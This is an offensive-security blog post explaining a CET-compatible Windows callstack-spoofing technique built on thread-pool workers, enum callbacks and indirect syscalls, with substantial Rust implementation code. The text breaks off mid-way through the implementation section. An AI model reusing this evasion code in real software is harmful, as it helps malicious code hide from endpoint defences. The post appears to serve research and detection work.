---
layout: post
title: "CET-Compliant Callstack Spoofing via Thread Pool Enum Callback Trampolining"
description: "A CET-compliant callstack spoofing technique that uses Windows thread-pool enum callbacks as syscall trampolines, defeating EDR stack telemetry without breaking Intel shadow-stack invariants."
date: 2026-07-12
permalink: /cet-callstack-spoofing-thread-pool-trampoline
lang: en
tags: [malware-dev, red-teaming, evasion, edr-evasion, cet, intel-cet, shadow-stack, hardware-mitigations, callstack-spoofing, stack-spoofing, indirect-syscalls, direct-syscalls, thread-pool, thread-pool-api, enum-callback, trampolining, windows-internals, winapi, x64-assembly, rtlvirtualunwind, rust, rustsec, infosec, offensive-security]
---

> **Disclaimer.** This research is published for **educational and defensive purposes only**. I do not endorse the use of this technique for unauthorized access to any computer system. Always obtain explicit written authorization before testing. If you use this on systems you don't own, that's on you, and it's illegal.

**GitHub Repository:** [MrTiz/CET-Enum-CallStack-Spoofer](https://github.com/MrTiz/CET-Enum-CallStack-Spoofer)

---

## Table of Contents

- [Table of Contents](#table-of-contents)
- [1. Abstract](#1-abstract)
- [2. A Brief History of Syscall Evasion](#2-a-brief-history-of-syscall-evasion)
  - [2.1 The era of API hooking and direct syscalls (~2019-2020)](#21-the-era-of-api-hooking-and-direct-syscalls-2019-2020)
  - [2.2 The EDR counterattack: kernel telemetry (~2021)](#22-the-edr-counterattack-kernel-telemetry-2021)
  - [2.3 Indirect syscalls (~2021-2022)](#23-indirect-syscalls-2021-2022)
  - [2.4 Call stack spoofing (~2022-2023)](#24-call-stack-spoofing-2022-2023)
  - [2.5 CET enters the picture (~2023-2025)](#25-cet-enters-the-picture-2023-2025)
  - [2.6 Where my technique fits](#26-where-my-technique-fits)
- [3. Background Concepts](#3-background-concepts)
  - [3.1 The Windows x64 Calling Convention](#31-the-windows-x64-calling-convention)
  - [3.2 How EDRs Inspect Call Stacks](#32-how-edrs-inspect-call-stacks)
  - [3.3 What Is an Indirect Syscall?](#33-what-is-an-indirect-syscall)
  - [3.4 The Windows Thread Pool](#34-the-windows-thread-pool)
  - [3.5 Enum Callback Functions](#35-enum-callback-functions)
  - [3.6 Manual Stack Unwinding with `RtlVirtualUnwind`](#36-manual-stack-unwinding-with-rtlvirtualunwind)
  - [3.7 Intel CET and the Shadow Stack](#37-intel-cet-and-the-shadow-stack)
  - [3.8 The TEB `ArbitraryUserPointer`](#38-the-teb-arbitraryuserpointer)
- [4. Technique Design](#4-technique-design)
  - [4.1 High-Level Overview](#41-high-level-overview)
  - [4.2 The Three Phases](#42-the-three-phases)
  - [4.3 The Resulting Callstack](#43-the-resulting-callstack)
- [5. Implementation Deep Dive](#5-implementation-deep-dive)
  - [5.1 The `EmbeddedContext` Structure](#51-the-embeddedcontext-structure)
  - [5.2 The Thread Pool Dispatcher](#52-the-thread-pool-dispatcher)
  - [5.3 Phase 1: The Thread Pool Worker](#53-phase-1-the-thread-pool-worker)
  - [5.4 Phase 2: The Enum Callback (Syscall Execution)](#54-phase-2-the-enum-callback-syscall-execution)
  - [5.5 Phase 3: Cleanup](#55-phase-3-cleanup)
  - [5.6 `user_mode_continue`: CET-Compliant Context Switch](#56-user_mode_continue-cet-compliant-context-switch)
  - [5.7 A Note on `RAX`: You Can't Get It Back](#57-a-note-on-rax-you-cant-get-it-back)
- [6. CET Compliance: The Core Contribution](#6-cet-compliance-the-core-contribution)
  - [6.1 Why Traditional Spoofing Breaks Under CET](#61-why-traditional-spoofing-breaks-under-cet)
  - [6.2 `JMP` Instead of RET](#62-jmp-instead-of-ret)
  - [6.3 Shadow Stack Pointer Reconciliation](#63-shadow-stack-pointer-reconciliation)
  - [6.4 Build Configuration for CET](#64-build-configuration-for-cet)
- [7. The 39 Enum Functions](#7-the-39-enum-functions)
  - [7.1 The Complete List](#71-the-complete-list)
  - [7.2 Why These Functions Work](#72-why-these-functions-work)
  - [7.3 Not All Functions Support All Syscall Argument Counts](#73-not-all-functions-support-all-syscall-argument-counts)
  - [7.4 A Note on `InitOnceExecuteOnce`](#74-a-note-on-initonceexecuteonce)
  - [7.5 Why Not `user32.dll`?](#75-why-not-user32dll)
- [8. The Debugging Nightmare](#8-the-debugging-nightmare)
  - [8.1 The Enum Function Crashes](#81-the-enum-function-crashes)
  - [8.2 The Thread Pool Crashes](#82-the-thread-pool-crashes)
  - [8.3 The 8-Byte Offset That Ruined My Week](#83-the-8-byte-offset-that-ruined-my-week)
  - [8.4 `INCSSPD` vs `INCSSPQ`: The 4-Byte Misalignment](#84-incsspd-vs-incsspq-the-4-byte-misalignment)
- [9. About This PoC](#9-about-this-poc)
  - [9.1 What Is Intentionally Simplified](#91-what-is-intentionally-simplified)
  - [9.2 This Is NOT a Weapon](#92-this-is-not-a-weapon)
- [10. Future Work](#10-future-work)
- [11. Detection and Countermeasures](#11-detection-and-countermeasures)
  - [11.1 TEB ArbitraryUserPointer Monitoring](#111-teb-arbitraryuserpointer-monitoring)
  - [11.2 Shadow Stack vs. Normal Stack Divergence](#112-shadow-stack-vs-normal-stack-divergence)
  - [11.3 Heuristic Call Stack Analysis](#113-heuristic-call-stack-analysis)
  - [11.4 Enum Callback Behavioral Analysis](#114-enum-callback-behavioral-analysis)
  - [11.5 Thread Pool Work Item Profiling](#115-thread-pool-work-item-profiling)
  - [11.6 `INCSSPQ` Instruction Monitoring](#116-incsspq-instruction-monitoring)
- [12. Conclusion](#12-conclusion)
- [13. Prior Art and Acknowledgments](#13-prior-art-and-acknowledgments)
- [14. References](#14-references)

---

## 1. Abstract

Modern Endpoint Detection and Response (EDR) solutions increasingly rely on call stack inspection to catch suspicious syscalls. When something like `NtProtectVirtualMemory` fires, the EDR walks the thread's call stack. If any return address points to unbacked memory, the operation gets flagged.

This article presents a callstack spoofing technique that combines three primitives:

- **Windows Thread Pool execution** for a clean stack base
- **Enum callback trampolining** for a real, legitimate mid-stack frame
- **Indirect syscalls** for a clean `syscall` return address

The result: a call stack where every frame is backed by a signed Windows module at the moment the `syscall` executes. No synthetic frames, no fabricated unwind data, no smoke and mirrors. The enum function is genuinely on the stack because we genuinely called it.

The actual contribution here is not in the individual components. All of them have been published before by other researchers (credited in [Section 13](#13-prior-art-and-acknowledgments)). What I put together is their composition and, most importantly, the **CET compliance mechanism**: a `jmp`-based context switch combined with direct shadow stack pointer reconciliation using `RDSSPQ`/`INCSSPQ`. This makes the technique work on systems with Intel CET hardware enforcement without touching unwind metadata.

The PoC is written in Rust with inline assembly and compiles with full CET support (`/CETCOMPAT`, `/guard:ehcont`, `control-flow-guard`).

---

## 2. A Brief History of Syscall Evasion

Before diving in, let me give some context on how we got here. The cat-and-mouse game between attackers and defenders around system calls has been going on for years, and understanding the history helps appreciate why CET compliance matters now.

### 2.1 The era of API hooking and direct syscalls (~2019-2020)

For years, EDRs relied on user-mode API hooking. The EDR injects a DLL into every process, places trampolines at the beginning of sensitive `ntdll.dll` functions (`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtWriteVirtualMemory`, etc.), and intercepts every call to inspect arguments before letting it through.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/user-mode-hooking.png" alt="User-mode hooking">
    <br>
    <em>Image credit: <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">RedOps</a></em>
</p>

The offensive response was **direct syscalls**: skip `ntdll.dll` entirely. Load the System Service Number (`SSN`) into `RAX`, execute `syscall` from your own code. No API call, no hook, no interception.

[SysWhispers](https://github.com/jthuraisamy/SysWhispers) by @jthuraisamy made this accessible by generating header/ASM stubs. [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) improved `SSN` resolution. Around the same time, [Hell's Gate](https://github.com/am0nsec/HellsGate) by am0nsec and smelly\_\_vx introduced dynamic `SSN` resolution by parsing `ntdll.dll` in memory. [Halo's Gate](https://blog.sektor7.net/#!res/2021/halosgate.md) and [Tartarus' Gate](https://github.com/trickster0/TartarusGate) by trickster0 handled cases where some stubs were hooked.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/direct_syscalls_principle.png" alt="Direct syscalls principle diagram">
    <br>
    <em>Image credit: <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">RedOps</a></em>
</p>

### 2.2 The EDR counterattack: kernel telemetry (~2021)

EDR vendors realized that hooking `ntdll.dll` was a losing battle. If the attacker runs code in your process, they can just unhook everything. So the focus shifted to kernel-level telemetry: the `Microsoft-Windows-Threat-Intelligence` ETW provider, kernel callbacks, and most importantly, call stack walking from the kernel side.

With direct syscalls, the call stack at the moment of the `syscall` looks like this:

```
0x00007FF7A1230042    ← your code (maybe unbacked memory)
kernel32!BaseThreadInitThunk+0x17
ntdll!RtlUserThreadStart+0x2C
```

That first frame is a dead giveaway. Game over.

### 2.3 Indirect syscalls (~2021-2022)

The answer was **indirect syscalls**: instead of executing `syscall` from your code, jump to an existing `syscall; ret` sequence inside `ntdll.dll`. This was popularized by @modexpblog (MDSec) in their blog post "[Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)" and later formalized in [SysWhispers3](https://github.com/klezVirus/SysWhispers3) by klezVirus.

The immediate return address now points into `ntdll.dll`. Clean. But the rest of the stack still reveals the real caller. EDRs started walking deeper.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/indirect_syscalls_principle.png" alt="Indirect syscalls principle diagram">
    <br>
    <em>Image credit: <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">RedOps</a></em>
</p>

### 2.4 Call stack spoofing (~2022-2023)

Next step: forge the entire stack. Make every frame look legitimate. Several researchers tackled this:

- [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) by mgeeky (passive spoofing during sleep)
- [SilentMoonwalk](https://github.com/klezVirus/SilentMoonwalk) by klezVirus (dynamic spoofing with synthetic unwindable frames)
- [VulcanRaven](https://github.com/WithSecureLabs/CallStackSpoofer) by WithSecure Labs (return address manipulation)
- [LoudSunRun](https://github.com/susMdT/LoudSunRun) by susMdT (combined SilentMoonwalk + VulcanRaven)
- [Unwinder](https://github.com/Kudaes/Unwinder) by Kudaes (Rust-based stack spoofing)

All solid work. But they all share a problem: they manipulate return addresses on the normal stack. And then Intel dropped the bomb.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/call_stack_spoofing_theory.png" alt="Call stack spoofing">
    <br>
    <em>Image credit: <a href="https://dtsec.us/2023-09-15-StackSpoofin/" target="_blank">dtsec.us</a></em>
</p>

### 2.5 CET enters the picture (~2023-2025)

Intel CET introduced the **shadow stack**: a hardware-enforced second copy of return addresses. On every `CALL`, the CPU pushes the return address to both stacks. On every `RET`, both are popped and compared. Mismatch? `#CP` fault, process dead.

You can overwrite the normal stack all day long. The shadow stack doesn't care. It has the real addresses, and you can't touch it with normal memory writes.

The first research specifically targeting CET compliance was [BYOUD (Bring Your Own Unwind Data)](https://klezvirus.github.io/posts/Byoud/) by klezVirus, presented at Black Hat Europe. BYOUD achieves CET compatibility by manipulating unwind metadata (`.pdata` sections). Completely different approach from what I present here, and worth studying.

### 2.6 Where my technique fits

I took a different route: instead of touching unwind metadata, I achieve CET compliance through two things:

1. Using `jmp` instead of `ret` for context switches (the shadow stack is not involved in `jmp`)
2. Directly advancing the Shadow Stack Pointer via `RDSSPQ`/`INCSSPQ` to realign it

Combined with thread pool + enum callback trampolining that produces a genuinely clean call stack (not synthetic frames but actual function calls).

I want to be clear: none of the pieces are mine. The contribution is putting them together in a way that works end-to-end under CET, and then spending an unreasonable amount of time debugging the crashes (more on that in [Section 8](#8-the-debugging-nightmare)).

---

## 3. Background Concepts

If you already know all of this, skip to [Section 4](#4-technique-design). If not, grab a coffee, because this is going to take a while.

### 3.1 The Windows x64 Calling Convention

On 64-bit Windows, the first four function arguments go in registers: `RCX`, `RDX`, `R8`, `R9`. Anything beyond that goes on the stack, starting at `[RSP+0x28]` from the callee's perspective.

The caller must also reserve 32 bytes of "home space" (shadow space) on the stack, even for functions with fewer than four arguments. The callee is allowed to use this space as scratch.

```
              ┌─────────────────────────┐
  RSP+0x00 →  │ Return address          │  ← pushed by CALL
              ├─────────────────────────┤
  RSP+0x08 →  │ Home space for RCX      │  ← 32 bytes, callee can trash these
  RSP+0x10 →  │ Home space for RDX      │
  RSP+0x18 →  │ Home space for R8       │
  RSP+0x20 →  │ Home space for R9       │
              ├─────────────────────────┤
  RSP+0x28 →  │ 5th argument            │  ← extra args start here
  RSP+0x30 →  │ 6th argument            │
              └─────────────────────────┘
```

This layout matters a lot for our technique because we build these frames manually. Get one offset wrong and the whole thing explodes. Trust me, I know (see [Section 8.3](#83-the-8-byte-offset-that-ruined-my-week)).

### 3.2 How EDRs Inspect Call Stacks

When a sensitive `syscall` fires, the kernel (or an EDR driver) captures the thread's call stack. On x64 Windows, stack walking uses unwind information from the PE's `.pdata` section. Each function has a `RUNTIME_FUNCTION` entry describing its frame layout. Given a `RIP` value, the unwinder computes the caller's state, and the caller's caller, all the way to the thread entry.

The EDR checks each return address: does it belong to a known, signed module? Or does it point to unbacked memory? One bad frame and the whole call is suspicious.

Our goal: make every frame look clean.

### 3.3 What Is an Indirect Syscall?

Instead of executing `syscall` from your own code, you jump to an existing `syscall; ret` sequence (bytes `0F 05 C3`) already present inside `ntdll.dll`.

In the PoC, I find the trampoline by scanning the target `Zw` function backwards:

```rust
fn get_trampoline(func_addr: *mut u8) -> Result<u64, ()> {
    let mut image_base: u64 = 0;
    let func_entry = unsafe {
        RtlLookupFunctionEntry(func_addr as u64, &raw mut image_base, null_mut())
    };

    let func_size = unsafe {
        (*func_entry).EndAddress - (*func_entry).BeginAddress
    } as usize;

    if func_size >= 3 {
        for i in (0..func_size - 2).rev() {
            let ptr = unsafe { func_addr.add(i) };

            if unsafe { read_unaligned(ptr as *const [u8; 3]) } == [0x0F, 0x05, 0xC3] { // syscall; ret
                return Ok(ptr as u64);
            }
        }
    }

    Err(())
}
```

When I want to run the `syscall`, I load the `SSN` into `RAX`, arguments into the right registers, and jump to the trampoline. The kernel sees the return address pointing into `ntdll.dll`. Clean.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ZwProtectVirtualMemory_trampoline_ssn.png" alt="x64dbg ZwProtectVirtualMemory disassembly">
    <br>
    <em>x64dbg ZwProtectVirtualMemory disassembly</em>
</p>

### 3.4 The Windows Thread Pool

The Thread Pool API (`CreateThreadpoolWork`, `SubmitThreadpoolWork`, etc.) lets you queue work items for execution by OS-managed worker threads. The important thing for us: these threads have naturally clean call stacks because the OS created them.

A thread pool worker's stack looks like:

```
YourCallback
ntdll!TppWorkpExecuteCallback+4D0            ← internal TP function
ntdll!TppWorkerThread+801                    ← internal TP function
kernel32!BaseThreadInitThunk+17
ntdll!RtlUserThreadStart+2C
```

(Side note: depending on your symbol configuration, the debugger might show `TppWorkpExecuteCallback` or `RtlSetThreadSubProcessTag+xxxx`. The latter happens because the actual thread pool functions are not always in the public symbol file. WinDbg with Microsoft's public PDBs resolves them correctly; other debuggers may not. It confused me the first time too.)

By running our code in a thread pool callback, we get a clean stack foundation for free. No suspicious thread creation, no unbacked entry points at the bottom.

### 3.5 Enum Callback Functions

Windows has tons of "Enum" functions that take a callback pointer and call it iteratively. `EnumSystemLocalesEx` enumerates locales, `EnumResourceTypesW` enumerates resource types, and so on.

The key property: when the OS calls your callback, the enum function itself appears as a real frame on the stack. Not a fake frame. `EnumSystemLocalesEx` (which internally dispatches to `kernelbase!Internal_EnumSystemLocales`) is genuinely calling your code. An EDR walking the stack sees a legitimate call from a signed module.

More on the specific 39 functions I identified in [Section 7](#7-the-39-enum-functions).

### 3.6 Manual Stack Unwinding with `RtlVirtualUnwind`

`RtlVirtualUnwind` is the core Windows API for programmatic stack unwinding. The OS uses it for exception handling, debuggers use it for stack walks. Given a RIP and the function's `RUNTIME_FUNCTION` entry, it computes the caller's register state: return address, stack pointer, saved registers, everything.

```c
PEXCEPTION_ROUTINE RtlVirtualUnwind(
    ULONG                          HandlerType,
    ULONG64                        ImageBase,
    ULONG64                        ControlPc,
    PRUNTIME_FUNCTION              FunctionEntry,
    PCONTEXT                       ContextRecord,    // in/out
    PVOID                         *HandlerData,
    PULONG64                       EstablisherFrame,
    PKNONVOLATILE_CONTEXT_POINTERS ContextPointers
);
```

I use it twice:
1. **Phase 1**: unwind from the thread pool worker to find where the TP internals expect control to return
2. **Phase 2**: unwind from the enum callback to find where `EnumSystemLocalesEx` expects its callback to return

Both times I capture the real return address from the unwind, then use it to build correctly-chained stack frames. This is not guesswork; I'm reading the exact same data that the OS would use.

### 3.7 Intel CET and the Shadow Stack

Intel CET is a hardware feature with a simple but devastating (for us) idea: every thread gets two stacks.

- The **normal stack** (`RSP`): writable by anyone
- The **shadow stack** (`SSP`): hardware-protected, only for return addresses

On `CALL`: push return address to both. On `RET`: pop from both, compare. Mismatch = `#CP` fault = process dead.

```
CALL some_function:
    Normal stack:  push return_addr     ← you can tamper with this
    Shadow stack:  push return_addr     ← hardware-protected, you can't

RET:
    pop normal_ret  from normal stack
    pop shadow_ret  from shadow stack
    if normal_ret != shadow_ret → #CP fault → crash
```

This kills traditional stack spoofing. You can forge the normal stack all you want, but the shadow stack has the real addresses and you can't write to it.

There are however two user-mode instructions we can use:

| Instruction | Opcode bytes | What it does |
|---|---|---|
| `RDSSPQ reg` | `F3 48 0F 1E C8` | Read Shadow Stack Pointer into `reg`. Returns `0` if CET is off. |
| `INCSSPQ reg` | `F3 48 0F AE E9` | Advance SSP forward by `reg × 8` bytes (one entry per unit on x64). |

**Important:** there is also a 32-bit variant, `INCSSPD`, which advances by `reg × 4` bytes. On x64, shadow stack entries are 8 bytes each. Using `INCSSPD` with a value of 1 advances by only 4 bytes, half an entry, and leaves the SSP misaligned. On x64, always use `INCSSPQ`. I learned this the hard way (see [Section 8.4](#84-incsspd-vs-incsspq-the-4-byte-misalignment)).

These are the foundation of my CET compliance strategy.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/fully_working_SSP_vs_CS.png" alt="Example of fully working Shadow Stack compared to normal call stack">
    <br>
    <em>Example of fully working Shadow Stack compared to normal call stack</em>
</p>

### 3.8 The TEB `ArbitraryUserPointer`

The Thread Environment Block (`TEB`) at offset `0x28` has a field called `ArbitraryUserPointer`. It's a per-thread pointer with no defined OS semantics. Applications can use it for whatever.

I use it as a covert data channel between Phase 1 and Phase 2. The problem: the enum callback has a fixed signature defined by Windows. I can't add extra parameters. But I need to pass a pointer to my `EmbeddedContext` somehow.

Since both the worker and the callback run on the same thread, I write the pointer to `TEB+0x28` in Phase 1 and read it back in Phase 2. Original value saved, restored when done.

Simple, but effective.

---

## 4. Technique Design

### 4.1 High-Level Overview

In one sentence: **I use a thread pool to call an enum function, whose callback performs a manual unwind and redirects execution to an indirect `syscall`, while keeping the CET shadow stack aligned.**

Three phases, same thread:

1. **Thread pool worker**: creates a clean stack base, unwinds one frame, redirects to an enum function (e.g. `EnumSystemLocalesEx`).
2. **Enum callback (first invocation)**: unwinds again, sets up the `syscall` registers, redirects to a `syscall; ret` trampoline in `ntdll.dll`.
3. **Enum callback (second invocation, if needed)**: cleans up stack slots, returns `0` to stop the enumeration. Only happens if the `syscall` returned non-zero (more on this in [7.2](#72-why-these-functions-work)).

Each "redirect" goes through `user_mode_continue`, a custom inline assembly routine that reconciles the CET shadow stack and restores the full CPU state before jumping to the target.

### 4.2 The Three Phases

Let me walk you through the stack visually.

**Before Phase 1: thread pool worker's natural stack**

```
  ┌─────────────────────────────────────────────────────────┐
  │ thread_pool_worker_enum (our callback)                  │ ← we are here
  │─────────────────────────────────────────────────────────│
  │ ntdll!TppWorkpExecuteCallback+4D0                       │
  │─────────────────────────────────────────────────────────│
  │ ntdll!TppWorkerThread+801                               │
  │─────────────────────────────────────────────────────────│
  │ kernel32!BaseThreadInitThunk+17                         │
  │─────────────────────────────────────────────────────────│
  │ ntdll!RtlUserThreadStart+2C                             │
  └─────────────────────────────────────────────────────────┘
```

We unwind our frame and redirect execution to `EnumSystemLocalesEx`. After the redirect:

**Inside `EnumSystemLocalesEx`, before it calls our callback:**

```
  ┌─────────────────────────────────────────────────────────┐
  │ kernelbase!EnumSystemLocalesEx                          │ ← we jumped here
  │─────────────────────────────────────────────────────────│
  │ ntdll!TppWorkpExecuteCallback+4D0                       │ ← return address preserved
  │─────────────────────────────────────────────────────────│
  │ ntdll!TppWorkerThread+801                               │
  │─────────────────────────────────────────────────────────│
  │ kernel32!BaseThreadInitThunk+17                         │
  │─────────────────────────────────────────────────────────│
  │ ntdll!RtlUserThreadStart+2C                             │
  └─────────────────────────────────────────────────────────┘
```

`EnumSystemLocalesEx` calls our callback. The callback unwinds and redirects to the `syscall` trampoline:

**Phase 2: the exact moment `syscall` executes**

```
  ┌─────────────────────────────────────────────────────────┐
  │ ntdll!NtProtectVirtualMemory+12                         │ ← `syscall; ret` trampoline
  │─────────────────────────────────────────────────────────│
  │ kernelbase!Internal_EnumSystemLocales+348               │ ← real frame
  │─────────────────────────────────────────────────────────│
  │ kernelbase!EnumSystemLocalesEx+1F                       │ ← real frame
  │─────────────────────────────────────────────────────────│
  │ ntdll!TppWorkpExecuteCallback+4D0                       │ ← thread pool
  │─────────────────────────────────────────────────────────│
  │ ntdll!TppWorkerThread+801                               │ ← thread pool
  │─────────────────────────────────────────────────────────│
  │ kernel32!BaseThreadInitThunk+17                         │
  │─────────────────────────────────────────────────────────│
  │ ntdll!RtlUserThreadStart+2C                             │
  └─────────────────────────────────────────────────────────┘
```

Every single frame: `ntdll.dll`, `kernelbase.dll`, or `kernel32.dll`. No unbacked memory.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ZwProtectVirtualMemory_callstack_ssp.png" alt="WinDbg callstack at the moment of syscall">
    <br>
    <em>WinDbg callstack at the moment of syscall</em>
</p>

### 4.3 The Resulting Callstack

The exact call stack captured during a real run, with offsets:

```
ntdll!NtProtectVirtualMemory+12
kernelbase!Internal_EnumSystemLocales+348
kernelbase!EnumSystemLocalesEx+1F
ntdll!TppWorkpExecuteCallback+4D0
ntdll!TppWorkerThread+801
kernel32!BaseThreadInitThunk+17
ntdll!RtlUserThreadStart+2C
```

`EnumSystemLocalesEx` (resolved from `kernelbase.dll`) internally calls `Internal_EnumSystemLocales`, which in turn calls our callback. Both frames are on the stack, both from `kernelbase.dll`.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/console_output.png" alt="Console output showing successful execution">
    <br>
    <em>Console output showing successful execution</em>
</p>

The full Proof of Concept repository is available on GitHub: [MrTiz/CET-Enum-CallStack-Spoofer](https://github.com/MrTiz/CET-Enum-CallStack-Spoofer).

---

## 5. Implementation Deep Dive

The PoC is Rust, targeting `x86_64-pc-windows-msvc`. Let's go through it piece by piece.

### 5.1 The `EmbeddedContext` Structure

This is the shared state across all three phases: `syscall` parameters, bookkeeping, stack backups.

```rust
#[repr(C)]
#[derive(Default)]
struct EmbeddedContext {
    ssn             : u32, // System Service Number
    // [4 bytes padding]
    trampoline      : u64, // Address of "syscall; ret" in ntdll
    args_len        : u64, // Number of syscall arguments (up to 11)
    arg1            : u64, // Syscall arguments 1..11
    arg2            : u64,
    // ... arg3 through arg11 ...
    invoke_count    : u64, // How many times the callback was invoked
    backup_addr_arg5: u64, // Phase 1 stack backups (address + value)
    backup_val_arg5 : u64,
    backup_addr_arg6: u64,
    backup_val_arg6 : u64,
    backup_addr_arg7: u64,
    backup_val_arg7 : u64,
    init_once       : u64,
    worker_ctx_ptr  : u64, // Pointer to Phase 1 CONTEXT
    callback_ctx_ptr: u64, // Pointer to Phase 2 CONTEXT
    saved_aup       : u64, // Original TEB ArbitraryUserPointer
    magic           : u64, // Self-referencing pointer for validation
    cb_sp           : u64, // Phase 2 stack pointer (for cleanup)
    cb_orig_5       : u64, // Phase 2 stack backups (original values)
    // ... cb_orig_6 through cb_orig_11 ...
}
```

The `magic` field stores the structure's own address (`embedded_ctx.magic = &embedded_ctx as u64`). In the callback, we validate the pointer from `TEB+0x28` by checking: "does `*(ptr + 0xC8)` equal `ptr` itself?" An arbitrary random pointer is almost certainly not going to pass that check.

### 5.2 The Thread Pool Dispatcher

The entry point. Creates a work item, submits it, waits, checks the result.

```rust
fn thread_pool_dispatcher(embedded_ctx: &mut EmbeddedContext) {
    embedded_ctx.magic = from_ref(embedded_ctx) as u64;

    loop {
        embedded_ctx.invoke_count = 0;
        let context_addr = from_ref::<EmbeddedContext>(embedded_ctx) as u64;

        let work = unsafe {
            CreateThreadpoolWork(
                Some(thread_pool_worker_enum),
                context_addr as *mut _,
                null_mut()
            )
        };
        unsafe { SubmitThreadpoolWork(work) };
        unsafe { WaitForThreadpoolWorkCallbacks(work, 0) };
        unsafe { CloseThreadpoolWork(work) };

        if embedded_ctx.invoke_count > 0 {
            break;
        }
    }
}
```

The loop is a safety net. If the `magic` validation fails in the callback (because something else wrote to `TEB+0x28` between phases), `invoke_count` stays `0` and we retry. In practice this never happens, but I'd rather retry than silently fail.

### 5.3 Phase 1: The Thread Pool Worker

The most complex phase. Let me go through it step by step.

**Capture and unwind:**

```rust
extern "system" fn thread_pool_worker_enum(
    mut _instance: PTP_CALLBACK_INSTANCE,
    context      : *mut c_void,
    mut _work    : PTP_WORK
) {
    // -- Step 1: Capture current CPU state --
    let mut aligned_context: AlignedContext = unsafe { zeroed() };
    let context_record: *mut CONTEXT = &raw mut aligned_context.0;

    unsafe { RtlCaptureContext(context_record) };

    // -- Step 2: Unwind one frame to get the parent's (TP internals) state --
    let mut handler_data     : *mut c_void = null_mut();
    let mut establisher_frame: u64 = 0;
    let mut image_base       : u64 = 0;

    let control_pc     = (unsafe { *context_record }).Rip;
    let function_entry = unsafe { RtlLookupFunctionEntry(control_pc, &raw mut image_base, null_mut()) };

    if function_entry.is_null() {
        // Leaf function fallback: simulate a plain `ret` by popping
        // the return address from [RSP] into RIP.
        (unsafe { *context_record }).Rip = unsafe { *((*context_record).Rsp as *const u64) };
        (unsafe { *context_record }).Rsp += 8;
    }
    else {
        unsafe {
            RtlVirtualUnwind(
                UNW_FLAG_NHANDLER,
                image_base,
                control_pc,
                function_entry,
                &raw mut (*context_record),
                &raw mut handler_data,
                &raw mut establisher_frame,
                null_mut(),
            );
        }
    }
```

`RtlCaptureContext` snapshots all CPU registers. `RtlVirtualUnwind` unwinds one frame, giving us the parent's (TP internals) `RIP` and `RSP`.

After the unwind, `context_record.Rip` contains the return address back into `TppWorkpExecuteCallback` and `context_record.Rsp` contains the TP internals' stack pointer. These are the exact values we need to build the redirected frame.

**Building the redirected stack:**

```rust
let real_return_address = (unsafe { *context_record }).Rip;
let new_rsp             = (unsafe { *context_record }).Rsp - 8;

unsafe { write_volatile(&raw mut (*context_record).Rsp,  new_rsp) };
unsafe { write_volatile(new_rsp as *mut u64, real_return_address) };
```

I subtract 8 from the parent's RSP and place the real return address there. This mimics what `CALL` would have done. When `EnumSystemLocalesEx` eventually returns, its `ret` pops this address and control goes back to the TP internals like nothing happened.

**Backing up stack slots and setting up the enum function call:**

```rust
// Save the stack slots that the enum function will use
let cb = manual_stack_unwind_enum as *const () as u64;
let sp_orig = (unsafe { *context_record }).Rsp as *mut u64;

args.backup_addr_arg5 = unsafe {  sp_orig.add(4) } as u64; // RSP + 0x20
args.backup_val_arg5  = unsafe { *sp_orig.add(4) };

args.backup_addr_arg6 = unsafe {  sp_orig.add(5) } as u64; // RSP + 0x28
args.backup_val_arg6  = unsafe { *sp_orig.add(5) };

args.backup_addr_arg7 = unsafe {  sp_orig.add(6) } as u64; // RSP + 0x30
args.backup_val_arg7  = unsafe { *sp_orig.add(6) };

// Set up the call to EnumSystemLocalesEx(callback, 0, 0, 0)
unsafe { write_volatile(&raw mut (*context_record).Rip, enum_cb_addr) };
unsafe { write_volatile(&raw mut (*context_record).Rcx, cb          ) }; // lpLocaleEnumProcEx (our callback)
unsafe { write_volatile(&raw mut (*context_record).Rdx, 0           ) }; // dwFlags
unsafe { write_volatile(&raw mut (*context_record).R8 , 0           ) }; // lParam
unsafe { write_volatile(&raw mut (*context_record).R9 , 0           ) }; // lpReserved

// Write the enum function's 5th, 6th, 7th arguments onto the stack
let sp_new = new_rsp as *mut u64;
unsafe { write_volatile(sp_new.add(5), 0) }; // [new_rsp + 0x28] = 5th parameter slot
unsafe { write_volatile(sp_new.add(6), 0) }; // [new_rsp + 0x30] = 6th parameter slot
unsafe { write_volatile(sp_new.add(7), 0) }; // [new_rsp + 0x38] = 7th parameter slot
```

That last block deserves explanation. Some of the 39 enum functions take more than 4 parameters (up to 7 among the ones I identified). Those extra parameters go on the stack. If we don't write proper values there, the enum function reads garbage and crashes. By zeroing those positions, we ensure that every enum function in the basket can be called safely, regardless of its arity. In this PoC, only `EnumSystemLocalesEx` (4 params) is used, but the infrastructure is there for the full 39-function basket.

**TEB handoff and context switch:**

```rust
let teb_addr = get_teb_address();

args.saved_aup = unsafe { read_volatile(teb_addr.add(0x28) as *const u64) };
unsafe { write_volatile(teb_addr.add(0x28).cast::<u64>(), context as u64) };

user_mode_continue(context_record, new_rsp);
```

Write the `EmbeddedContext` pointer to `TEB+0x28`, then switch context.

### 5.4 Phase 2: The Enum Callback (Syscall Execution)

`EnumSystemLocalesEx` calls our callback. The stack now legitimately includes
